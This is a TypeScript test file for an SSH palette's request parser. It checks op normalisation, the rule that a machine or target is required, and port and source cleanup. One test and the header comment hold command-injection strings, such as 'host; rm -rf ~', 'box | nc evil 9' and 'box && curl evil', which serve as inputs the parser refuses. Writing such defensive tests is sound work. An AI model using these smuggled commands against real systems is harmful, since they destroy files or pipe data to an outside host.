/**
 * The ssh-op parser: the boundary between a palette's JSON and a real shell.
 *
 * Everything downstream of this function eventually gets typed into a pane, so
 * the interesting assertions are the two kinds of refusal it makes:
 *
 * - **No target.** `connect` with neither a machine nor a target is refused
 *   rather than resolved to "ssh to nowhere", because the alternative is a pane
 *   that opens and sits at a local prompt looking like a successful connect.
 * - **A target is one destination, not a shell.** A pasted `ssh user@host -p
 *   2222` is admitted, because that is how a machine reaches a palette, but only
 *   as tokens the parser understands. Anything carrying a shell metacharacter is
 *   dropped, which is what keeps `{"target": "host; rm -rf ~"}` from becoming two
 *   commands.
 *
 * The normalisation cases matter for the same reason: a machine that arrives
 * over the wire is rebuilt through the same `makeMachine` the roster uses, so a
 * string `port` or a `source` nobody defined cannot reach the connect line.
 */
import { describe, expect, it } from 'vitest'
import { isProReject, machineOf, parseProSsh, type ProSshRequest } from '../src/shared/proIpc'

/** Narrow a parse to a request, failing the test if it was rejected. */
function parsed(payload: unknown): ProSshRequest {
  const result = parseProSsh(payload)
  if (isProReject(result)) {
    throw new Error(`expected a request, got ${result.code}: ${result.error}`)
  }
  return result
}

/** The rejection side of a parse, as a code/message pair. */
function refused(payload: unknown): { code: string; error: string } {
  const result = parseProSsh(payload)
  if (!isProReject(result)) throw new Error(`expected a rejection, got ${JSON.stringify(result)}`)
  return { code: result.code, error: result.error }
}

describe('the ops that need nothing', () => {
  it('reads an empty or nonsense payload as `list`, since asking is the default', () => {
    const empties: unknown[] = [{}, null, undefined, 'nonsense', 42, []]
    for (const payload of empties) {
      expect(parsed(payload)).toEqual({ op: 'list', query: '' })
    }
  })

  it('trims and folds the op, because it arrives in JSON we did not write', () => {
    expect(parsed({ op: '  KEYS ' })).toEqual({ op: 'keys' })
    expect(parsed({ op: 'Terminal', cwd: '/tmp' })).toEqual({ op: 'terminal', cwd: '/tmp' })
  })

  it('names the op it refused', () => {
    const bad = refused({ op: 'formatDisk' })
    expect(bad.code).toBe('bad-op')
    expect(bad.error).toContain('formatDisk')
  })

  it('takes `keys` with no arguments and drops whatever else came along', () => {
    expect(parsed({ op: 'keys', machine: { host: 'x' } })).toEqual({ op: 'keys' })
  })
})

describe('list', () => {
  it('trims the filter and accepts the short alias for it', () => {
    expect(parsed({ op: 'list', query: '  prod  ' })).toEqual({ op: 'list', query: 'prod' })
    expect(parsed({ op: 'list', q: 'web' })).toEqual({ op: 'list', query: 'web' })
  })

  it('caps the filter, so a pasted megabyte cannot become a roster scan', () => {
    const request = parsed({ op: 'list', query: 'a'.repeat(5000) })
    if (request.op !== 'list') throw new Error('expected list')
    expect(request.query).toHaveLength(200)
  })
})

describe('remove', () => {
  it('needs an id, and says so rather than removing nothing', () => {
    expect(refused({ op: 'remove' }).code).toBe('bad-machine')
    expect(refused({ op: 'remove', id: '   ' }).code).toBe('bad-machine')
  })

  it('trims the id it hands to the store', () => {
    expect(parsed({ op: 'remove', id: '  m1  ' })).toEqual({ op: 'remove', id: 'm1' })
  })
})

describe('terminal', () => {
  it('means home when no directory came with it', () => {
    expect(parsed({ op: 'terminal' })).toEqual({ op: 'terminal', cwd: '' })
  })

  it.each([
    ['cwd', '/tmp/a'],
    ['workdir', '/tmp/b'],
    ['path', '/tmp/c']
  ])('reads the directory out of `%s`', (field, value) => {
    expect(parsed({ op: 'terminal', [field]: value })).toEqual({ op: 'terminal', cwd: value })
  })
})

describe('the machine-or-target rule', () => {
  const ops = ['probe', 'save', 'connect', 'setup'] as const

  it.each(ops)('%s refuses a payload with neither a machine nor a target', (op) => {
    const bad = refused({ op })
    expect(bad.code).toBe('bad-machine')
    expect(bad.error).toContain('machine')
  })

  it.each(ops)('%s refuses a machine blob with no host and no alias', (op) => {
    expect(refused({ op, machine: { user: 'alice', port: 22 } }).code).toBe('bad-machine')
  })

  it('accepts a target on its own, leaving the machine for the service to build', () => {
    const request = parsed({ op: 'probe', target: 'alice@box:2222' })
    if (request.op !== 'probe') throw new Error('expected probe')
    expect(request.machine).toBeNull()
    expect(request.target).toBe('alice@box:2222')
  })

  it.each(ops)('%s drops a target that smuggles a second command', (op) => {
    // Not a sanitiser - a category rule. `host; rm -rf ~` is two commands, and
    // the field only ever means one destination, so it is refused outright
    // instead of being cut down to the part before the semicolon. A single token
    // with a metacharacter in it (`box;id`) is a different case: it names one
    // destination, and `shellQuote` keeps it one argument when the line is typed.
    for (const target of ['box ; rm -rf ~', 'box | nc evil 9', 'box && curl evil', 'ssh box; rm -rf ~', 'box\nrm -rf ~']) {
      expect(refused({ op, target }).code, target).toBe('bad-machine')
    }
  })

  it.each(ops)('%s keeps a pasted ssh command line, spaces and all', (op) => {
    // The string a user copies out of a README. Refusing it would send them to a
    // terminal to take it apart by hand, which is the exact step the palette
    // exists to remove.
    const request = parsed({ op, target: 'ssh wanlian@172.18.29.206 -p 2222' })
    if (
      request.op !== 'probe' &&
      request.op !== 'save' &&
      request.op !== 'connect' &&
      request.op !== 'setup'
    ) {
      throw new Error('expected a machine op')
    }
    expect(request.target).toBe('ssh wanlian@172.18.29.206 -p 2222')
  })

  it.each(ops)('%s drops two bare words, which name no machine', (op) => {
    expect(refused({ op, target: 'two words' }).code).toBe('bad-machine')
  })
})

describe('connect', () => {
  it('pins by default, because the second connect should cost one keystroke', () => {
    const request = parsed({ op: 'connect', target: 'alice@box' })
    if (request.op !== 'connect') throw new Error('expected connect')
    expect(request.save).toBe(true)
  })

  it('honours an explicit false, and only a real boolean', () => {
    const off = parsed({ op: 'connect', target: 'alice@box', save: false })
    if (off.op !== 'connect') throw new Error('expected connect')
    expect(off.save).toBe(false)

    // A string is not a decision. Falling back to the default beats reading
    // `"no"` as false and then pinning nothing the human asked about.
    const lied = parsed({ op: 'connect', target: 'alice@box', save: 'no' })
    if (lied.op !== 'connect') throw new Error('expected connect')
    expect(lied.save).toBe(true)
  })

  it('carries the directory a session opens in', () => {
    const request = parsed({ op: 'connect', target: 'box', workdir: '/repo' })
    if (request.op !== 'connect') throw new Error('expected connect')
    expect(request.cwd).toBe('/repo')
  })
})

describe('setup', () => {
  it('runs by default, and can be asked for the plan only', () => {
    const run = parsed({ op: 'setup', target: 'box' })
    if (run.op !== 'setup') throw new Error('expected setup')
    expect(run.run).toBe(true)

    const plan = parsed({ op: 'setup', target: 'box', run: false })
    if (plan.op !== 'setup') throw new Error('expected setup')
    expect(plan.run).toBe(false)
  })

  it('trims the key it would publish', () => {
    const request = parsed({ op: 'setup', target: 'box', key: '  ~/.ssh/id_ed25519.pub  ' })
    if (request.op !== 'setup') throw new Error('expected setup')
    expect(request.key).toBe('~/.ssh/id_ed25519.pub')
  })
})

describe('machineOf', () => {
  it('rebuilds a wire machine through the roster constructor', () => {
    const machine = machineOf({
      id: ' m1 ',
      host: '  10.0.0.5  ',
      port: '2222',
      user: ' deploy ',
      source: 'CONFIG'
    })
    expect(machine).not.toBeNull()
    expect(machine?.host).toBe('10.0.0.5')
    // A port arrives as a number, whatever the caller thought it was sending.
    expect(machine?.port).toBe(2222)
    expect(machine?.user).toBe('deploy')
    expect(machine?.source).toBe('config')
  })

  it('clamps a port that is not a port', () => {
    expect(machineOf({ host: 'box', port: 99999 })?.port).toBe(0)
    expect(machineOf({ host: 'box', port: 'lots' })?.port).toBe(0)
    expect(machineOf({ host: 'box', port: -3 })?.port).toBe(0)
  })

  it('falls back to `saved` for a source nobody defined', () => {
    expect(machineOf({ host: 'box', source: 'invented' })?.source).toBe('saved')
  })

  it('accepts an alias with no hostname, since config supplies the rest', () => {
    const machine = machineOf({ alias: 'prod' })
    expect(machine?.alias).toBe('prod')
    expect(machine?.host).toBe('prod')
  })

  it('labels an unlabelled machine the way a human would write it', () => {
    expect(machineOf({ host: 'box', user: 'alice' })?.label).toBe('alice@box')
    expect(machineOf({ host: 'box' })?.label).toBe('box')
  })

  it('refuses anything that is not a machine', () => {
    expect(machineOf(null)).toBeNull()
    expect(machineOf('box')).toBeNull()
    expect(machineOf({ user: 'alice' })).toBeNull()
  })
})
